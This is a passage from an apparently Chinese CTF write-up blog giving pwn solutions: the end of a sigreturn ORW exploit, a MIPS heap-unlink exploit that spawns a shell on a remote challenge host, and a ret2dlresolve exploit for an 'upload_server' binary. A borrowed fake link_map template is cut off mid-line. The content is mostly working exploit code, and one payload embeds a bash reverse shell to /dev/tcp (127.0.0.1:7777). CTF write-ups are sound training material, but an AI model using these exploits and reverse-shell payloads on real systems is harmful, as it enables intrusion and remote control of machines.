class="line">        orw += p64(pop_rdi_ret) + p64(<span class="number">4</span>)</span><br><span class="line">        orw += p64(pop_rdx_ret) + p64(<span class="number">0x30</span>)</span><br><span class="line">        orw += p64(pop_rsi_ret) + p64(heap_base)</span><br><span class="line">        orw += p64(Read)</span><br><span class="line">        orw += p64(pop_rdi_ret)+p64(heap_base)</span><br><span class="line">        orw += p64(Puts)</span><br><span class="line">        orw += <span class="string">'./flag\x00'</span></span><br><span class="line">        frame = SigreturnFrame()</span><br><span class="line">        frame.rax = <span class="number">0</span></span><br><span class="line">        frame.rdi = <span class="number">0</span></span><br><span class="line">        frame.rsi = <span class="number">0</span></span><br><span class="line">        frame.rdx = <span class="number">0</span></span><br><span class="line">        frame.rsp = heap_base + <span class="number">0x250</span> + <span class="number">0x90</span> + <span class="number">0x30</span> + <span class="number">0x20</span> + <span class="number">0x10</span></span><br><span class="line">        frame.rip = ret</span><br><span class="line">        payload = orw + str(frame)[len(orw):]</span><br><span class="line">        <span class="comment"># gdb.attach(p)</span></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        edit(<span class="number">3</span>, payload)</span><br><span class="line">        </span><br><span class="line">        free(<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>一道mips unlink，非常简单。虽然貌似官方给的wp不是这个解法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"><span class="comment"># sh = process(['./qemu-mipsel-static','-L','./','./pwn3'])</span></span><br><span class="line">sh = remote(<span class="string">'183.129.189.62'</span>,<span class="number">61303</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">'info:'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'user:'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt;'</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'edit:'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'info:'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'show:'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'info: '</span>)</span><br><span class="line">    content = sh.recvuntil(<span class="string">'\nDisplay complete!'</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line">buf_addr = <span class="number">0x411830</span></span><br><span class="line">free_got = <span class="number">0x4117B4</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaa'</span>) <span class="comment">#0x69</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">payload = p32(<span class="number">0</span>) + p32(<span class="number">0x60</span>) + p32(buf_addr - <span class="number">3</span>*<span class="number">4</span>) + p32(buf_addr - <span class="number">2</span>*<span class="number">4</span>) + <span class="string">'A'</span> * <span class="number">0x50</span> + p32(<span class="number">0x60</span>) +p32(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">8</span> + p32(buf_addr) + p32(<span class="number">0x60</span>) + p32(free_got) + p32(<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free_addr = u32(show(<span class="number">1</span>).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">'free = '</span> + hex(free_addr))</span><br><span class="line">libc_base = free_addr - <span class="number">0x56B68</span></span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">system = libc_base + <span class="number">0x5f8f0</span></span><br><span class="line">payload = p32(system)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="upload-server"><a href="#upload-server" class="headerlink" title="upload_server"></a>upload_server</h2><ul><li>recvmsg函数的msg.msg_iov-&gt;iov_len 也就是接收数据最大值为0x410，并且将接收到的数据存放在全局变量段(msg.msg_iov-&gt;iov_base=0x603160）。第一段check先通过正则判断数据是否为base64密文格式，然后将其base64解密后存放在s变量栈上，解密后数据的最大长度为0x410*(3/4)=0x30c字节，存在栈溢出。然后判断解密后的数据长度是否为大于64，最后将数据的0-31位与33-64位分别base64加密后将相应内容写入key文件夹中。</li><li>由于整段功能代码放在子进程里面实现，所以子进程崩溃后父进程回收即可，不影响父进程运行。server虽然存在栈溢出，但利用起来也十分有限，无法泄露地址。栈溢出长度也有限制，必须进行栈迁移，先通过ROP去调用内置decode函数解密存在在bss段的rop数据，再栈迁去执行bss段的rop_chain.利用dlruntime_resolve一把梭，提前在bss段相应地址构造fake_linkmap数据，由于程序中不存在写相关函数，可使用memset设置link_map的值，最后通过dl调用到system函数执行”bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;\x00” 反弹shell。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">"server"</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"127.0.0.1"</span>,<span class="number">2333</span>)</span><br><span class="line"></span><br><span class="line">fake=[<span class="string">'P'</span>, <span class="string">'L'</span>, <span class="string">'\x02'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\xc8'</span>, <span class="string">'\xe6'</span>, <span class="string">']'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x07'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\xf0'</span>, <span class="string">'2'</span>, <span class="string">'`'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'`'</span>, <span class="string">'3'</span>, <span class="string">'`'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'h'</span>, <span class="string">' '</span>, <span class="string">'`'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x08'</span>, <span class="string">'3'</span>, <span class="string">'`'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'h'</span>, <span class="string">'3'</span>, <span class="string">'`'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>]</span><br><span class="line"></span><br><span class="line">fake_link_map=<span class="string">""</span>.join(fake)</span><br><span class="line"></span><br><span class="line">gad1= <span class="number">0x40192a</span></span><br><span class="line">gad2=<span class="number">0x401910</span></span><br><span class="line">decode=<span class="number">0x400ee7</span></span><br><span class="line"></span><br><span class="line">off=<span class="number">0x198</span>   </span><br><span class="line">pop_rdi=<span class="number">0x401933</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x401931</span></span><br><span class="line">leave_ret=<span class="number">0x401823</span></span><br><span class="line">link_map=<span class="number">0x602008</span></span><br><span class="line">memset_got=elf.got[<span class="string">'memset'</span>]</span><br><span class="line">bss=<span class="number">0x603160</span></span><br><span class="line">map_addr=bss+<span class="number">0x190</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"s"</span>*<span class="number">64</span></span><br><span class="line"><span class="comment">#使用mmap修改link_map</span></span><br><span class="line">payload+=p64(gad1)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(memset_got)+p64(<span class="number">1</span>)+p64(map_addr&amp;<span class="number">0xff</span>)+p64(link_map)+p64(gad2)+<span class="string">"1"</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(memset_got)+p64(<span class="number">1</span>)+p64((map_addr&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)+p64(link_map+<span class="number">1</span>)+p64(gad2)+<span class="string">"1"</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(memset_got)+p64(<span class="number">1</span>)+p64((map_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)+p64(link_map+<span class="number">2</span>)+p64(gad2)+<span class="string">"1"</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(memset_got)+p64(<span class="number">5</span>)+p64(<span class="number">0</span>)+p64(link_map+<span class="number">3</span>)+p64(gad2)+<span class="string">"1"</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(bss+<span class="number">0x2d0</span>)+p64(<span class="number">0x400A36</span>)+fake_link_map+p64(bss+<span class="number">64</span><span class="number">-8</span>)+ (pop_rdi)+p64(bss)+p64(pop_rsi_r15)+p64(bss)+p64(<span class="number">0</span>)+p64(decode)+p64(leave_ret)+<span class="string">"bash -c \"bash -i &gt;&amp; /dev/tcp/127.0.0.1/7777 0&lt;&amp;1\"\x00"</span></span><br><span class="line"></span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure><p>在复现的时候主要感觉他这个fake_link的构造很玄学，然后在网上找了个板子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=<span class="string">'/bin/zsh'</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2-dl"</span>)</span><br><span class="line"></span><br><span class="line">bss = elf.bss()</span><br><span class="line">log.info(<span class="string">".bss :0x%X"</span>%bss)</span><br><span class="line">write_addr = bss+<span class="number">0xac0</span>    <span class="comment"># 这里要调试一下，rsp有可能落在非bss上</span></span><br><span class="line">rbp = write_addr<span class="number">-0x8</span></span><br><span class="line">fake_link_map_addr = write_addr+<span class="number">0x18</span></span><br><span class="line">vuln_addr = <span class="number">0x0000000000400687</span></span><br><span class="line">pop7ret = <span class="number">0x000000000040073a</span></span><br><span class="line">mov3call = <span class="number">0x0000000000400720</span></span><br><span class="line">plt_load = <span class="number">0x4004e6</span> <span class="comment"># jmp</span></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ELF64_sym_size = 0x18</span></span><br><span class="line"><span class="comment"># ELF64_Rela_size = 0x18</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct            </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    Elf64_Word    st_name;        /* Symbol name (string tbl index) */</span></span><br><span class="line"><span class="string">      unsigned char    st_info;    /* Symbol type and binding */        </span></span><br><span class="line"><span class="string">      unsigned char st_other;        /* Symbol visibility */              </span></span><br><span class="line"><span class="string">      Elf64_Section    st_shndx;    /* Section index */                  </span></span><br><span class="line"><span class="string">      Elf64_Addr    st_value;        /* Symbol value */                   </span></span><br><span class="line"><span class="string">      Elf64_Xword    st_size;        /* Symbol size */                    </span></span><br><span class="line"><span class="string">&#125;Elf64_Sym;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">typedef struct           </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  Elf64_Addr    r_offset;        /* Address */                         </span></span><br><span class="line"><span class="string">  Elf64_Xword    r_info;            /* Relocation type and symbol index */</span></span><br><span class="line"><span class="string">  Elf64_Sxword    r_addend;        /* Addend */                          </span></span><br><span class="line"><span class="string">&#125;Elf64_Rela;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">typedef struct          </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  Elf64_Sxword    d_tag;            /* Dynamic entry type */</span></span><br><span class="line"><span class="string">  union</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      Elf64_Xword d_val;        /* Integer value */</span></span><br><span class="line"><span class="string">      Elf64_Addr d_ptr;            /* Address value */</span></span><br><span class="line"><span class="string">    &#125; d_un;</span></span><br><span class="line"><span class="string">&#125;Elf64_Dyn;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_STR_addr = link_map +0x68  </span></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_SYM_addr = link_map +0x70  </span></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_JMPREL_addr = link_map +0xf8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_fake_link_map</span><span class="params">(fake_link_map_addr,l_addr,st_value)</span>:</span></span><br><span class="line">  <span class="comment"># 给出各个指针的假地址</span></span><br><span class="line">  fake_Elf64_Dyn_STR_addr = p64(fake_link_map_addr)</span><br><span class="line">  fake_Elf64_Dyn_SYM_addr = p64(fake_link_map_addr + <span class="number">0x8</span>)</span><br><span class="line">  fake_Elf64_Dyn_JMPREL_addr = p64(fake_link_map_addr + <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 伪造相关结构体</span></span><br><span class="line">  fake_Elf64_Dyn_SYM = flat(p64(<span class="number">0</span>),p64(st_value<span class="number">-8</span>))</span><br><span class="line">  fake_Elf64_Dyn_JMPREL = flat(p64(<span class="number">0</span>),p64(fake_link_map_addr+<span class="number">0x28</span>)  )<span class="comment"># JMPREL指向.rel.plt地址，放在fake_link_map_addr+0x28</span></span><br><span class="line">  r_offset = fake_link_map_addr - l_addr</span><br><span class="line">  log.info(<span class="string">"r_offset :"</span>+str(hex(r_offset)))</span><br><span class="line">  fake_Elf64_rela = flat(p64(r_offset),p64(<span class="number">7</span>),p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">  <span class="comment"># fake_link_map整体结构</span></span><br><span class="line">  fake_link_map = flat(   <span class="comment"># 0x0</span></span><br><span class="line">    p64(l_addr),          <span class="comment"># 0x8</span></span><br><span class="line">    fake_Elf64_Dyn_SYM,   <span class="comment"># 0x18</span></span><br><span class="line">    fake_Elf64_Dyn_JMPREL,<span class="comment"># 0x28</span></span><br><span class="line">    fake_Elf64_rela,      <span class="comment"># 0x40</span></span><br><span class="line">    <span class="string">"\x00"</span>*<span class="number">0x28</span>,         <span class="comment"># 0x68，下面开始放指针</span></span><br><span class="line">    fake_Elf64_Dyn_STR_addr,  <span class="comment"># STRTAB指针,0x70</span></span><br><span class="line">    fake_Elf64_Dyn_SYM_addr,  <span class="comment"># SYMTAB指针,0x78</span></span><br><span class="line">    <span class="string">"/bin/sh\x00"</span>.ljust(<span class="number">0x80</span>,<span class="string">"\x00"</span>),</span><br><span class="line">    fake_Elf64_Dyn_JMPREL_addr, <span class="comment"># JMPREL指针</span></span><br><span class="line">  )</span><br><span class="line">  <span class="keyword">return</span> fake_link_map</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l_addr = libc.sym[<span class="string">'system'</span>] - libc.sym[<span class="string">'__libc_start_main'</span>] <span class="comment"># l-&gt;l_addr设置为 system 与 __libc_start_main 的偏移值,此时__libc_start_main是一个已经解析过的函数</span></span><br><span class="line">log.info(<span class="string">"l_addr :"</span>+str(hex(l_addr)))</span><br><span class="line">log.info(<span class="string">"elf.got['__libc_start_main'] :"</span>+str(hex(elf.got[<span class="string">'__libc_start_main'</span>])))</span><br><span class="line">log.info(<span class="string">"plt_load :"</span>+str(hex(<span class="number">0x4004e6</span>)))</span><br><span class="line">log.info(<span class="string">"write_addr :"</span>+str(hex(write_addr)))</span><br><span class="line"><span class="comment">#l-&gt;l_addr + sym-&gt;st_value</span></span><br><span class="line"><span class="comment"># value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span></span><br><span class="line">st_value = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">fake_link_map = get_fake_link_map(fake_link_map_addr,l_addr,st_value)</span><br><span 